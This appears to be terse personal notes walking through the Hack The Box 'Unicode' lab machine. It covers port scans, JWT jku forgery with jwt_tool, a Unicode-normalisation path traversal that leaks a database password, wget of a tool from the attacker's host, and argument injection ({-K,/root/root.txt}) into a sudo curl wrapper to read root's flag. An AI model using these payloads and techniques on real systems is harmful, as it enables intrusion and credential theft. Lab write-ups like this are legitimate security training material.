# scanning
* `TCP` Scan
TARGET=10.10.11.126 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;
protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS POST
|_http-title: Hackmedia
|_http-generator: Hugo 0.83.1


> dirsearch -u http://10.10.11.126 -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f -x 503,403
[08:03:36] 308 -  264B  - /checkout  ->  http://10.10.11.126/checkout/
[08:03:54] 308 -  258B  - /debug  ->  http://10.10.11.126/debug/
[08:04:00] 308 -  262B  - /display  ->  http://10.10.11.126/display/
[08:04:00] 302 -  234B  - /display/  ->  http://10.10.11.126/unauth_error/
[08:04:48] 200 -   15B  - /internal/
[08:05:06] 200 -   84KB - /login/
[08:06:06] 308 -  264B  - /redirect  ->  http://10.10.11.126/redirect/
[08:06:08] 200 -   85KB - /register/

* inspect cookie and decode jwt
* add /etc/hosts entry and access
http://hackmedia.htb/static/jwks.json
```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}

{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/static/jwks.json"
}
```

> ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/workspace/htb-Unicode/private.key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/workspace/htb-Unicode/private.key
Your public key has been saved in /root/workspace/htb-Unicode/private.key.pub
The key fingerprint is:
SHA256:Cj2siRve4/80gePit+4/hZsnY7plMw3CSrIq9bE3nR4 root@kali
The key's randomart image is


eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.mMhI-nuDNiZxv0Cmq-PAezgBUAPVWjtL5P5795Ima3DmGuqL2h2yIFf2b0VhTfzeZxCKa7S9cirV3WBqlLeP3MMGZ0K1f6oQNs4o_FfPJ7LCkV7M6Ba73tV2kSsSXiNI9-JTd9JYLVdARkVOh7yHpRNIZmTNzMvj1X5qowbunNoyj3s9UOwV3xczbc0go0KccZ4czLw-AatNh2eYIzgHA4z-P2SYt_pl4nrw3UmPF4dIPRXgUCMBkMDVzxS8qU_C_djI6cXyNpLZ9h4b6qoqOKhgRdVQjtUNE1YfzcVDDg0kYFgGoH5p4jT1K8uYGYusFIi9DT8yX6AjZy_IWGjXBw

python3 jwt_tool.py -M at -t "http://hackmedia.htb" -rc "auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.mMhI-nuDNiZxv0Cmq-PAezgBUAPVWjtL5P5795Ima3DmGuqL2h2yIFf2b0VhTfzeZxCKa7S9cirV3WBqlLeP3MMGZ0K1f6oQNs4o_FfPJ7LCkV7M6Ba73tV2kSsSXiNI9-JTd9JYLVdARkVOh7yHpRNIZmTNzMvj1X5qowbunNoyj3s9UOwV3xczbc0go0KccZ4czLw-AatNh2eYIzgHA4z-P2SYt_pl4nrw3UmPF4dIPRXgUCMBkMDVzxS8qU_C_djI6cXyNpLZ9h4b6qoqOKhgRdVQjtUNE1YfzcVDDg0kYFgGoH5p4jT1K8uYGYusFIi9DT8yX6AjZy_IWGjXBw"

> echo -e '\u2025\u002f\u2025\u002f\u2025\u002f\u2025\u002fetc\u002fpasswd'
http://10.10.11.126/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events { worker_connections 768;
# multi_accept on;
} http { ## # Basic Settings ## sendfile on;
tcp_nopush on;
tcp_nodelay on;
keepalive_timeout 65;
types_hash_max_size 2048;
# server_tokens off;
# server_names_hash_bucket_size 64;
# server_name_in_redirect off;
include /etc/nginx/mime.types;
default_type application/octet-stream;
## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
# Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on;
## # Logging Settings ## access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;
## # Gzip Settings ## gzip on;
# gzip_vary on;
# gzip_proxied any;
# gzip_comp_level 6;
# gzip_buffers 16 8k;
# gzip_http_version 1.1;
# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf;
include /etc/nginx/sites-enabled/*;
} #mail { # # See sample authentication script at: # # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript # # # auth_http localhost/auth.php;
# # pop3_capabilities "TOP" "USER";
# # imap_capabilities "IMAP4rev1" "UIDPLUS";
# # server { # listen localhost:110;
# protocol pop3;
# proxy on;
# } # # server { # listen localhost:143;
# protocol imap;
# proxy on;
# } #} 


## http://10.10.11.126/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/nginx/sites-enabled/default
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s; server{ #Change the Webroot from /home/code/app/ to /var/www/html/ #change the user password from db.yaml listen 80; error_page 503 /rate-limited/; location / { limit_req zone=mylimit; proxy_pass http://localhost:8000; include /etc/nginx/proxy_params; proxy_redirect off; } location /static/{ alias /home/code/coder/static/styles/; } } 
```

http://10.10.11.126/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml
```
mysql_host: "localhost" mysql_user: "code" mysql_password: "B3stC0d3r2021@@!" mysql_db: "user" 
```

* ssh to the target
code@code:~$ cat user.txt 

# pe
> sudo -l 
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
code@code:~$ ls -ls /usr/bin/treport
6692 -rwxr-xr-x 1 root root 6850224 Sep  4 10:33 /usr/bin/treport


code@code:~$ wget http://10.10.x.x/pspy64
--2022-01-09 21:59:58--  http://10.10.x.x/pspy64
Connecting to 10.10.x.x:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                     100%[=====================================================================================>]   2.94M  1.22MB/s    in 2.4s    

2022-01-09 22:00:01 (1.22 MB/s) - ‘pspy64’ saved [3078592/3078592]

code@code:~$ chmod +x pspy64


code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:10.10.x.x/test.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    19  100    19    0     0     51      0 --:--:-- --:--:-- --:--:--    51


2022/01/09 22:00:59 CMD: UID=0    PID=1683   | sh -c /bin/bash -c "curl 10.10.x.x/test.sh -o /root/reports/threat_report_22_00_48" 
2022/01/09 22:00:59 CMD: UID=0    PID=1684   | /bin/bash -c curl 10.10.x.x/test.sh -o /root/reports/threat_report_22_00_48 


Enter your choice:3   
Enter the IP/file_name:{-K,/root/root.txt}
Warning: /root/root.txt:1: warning: 'e4b60799dc91455243e26a401f812ba5' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information

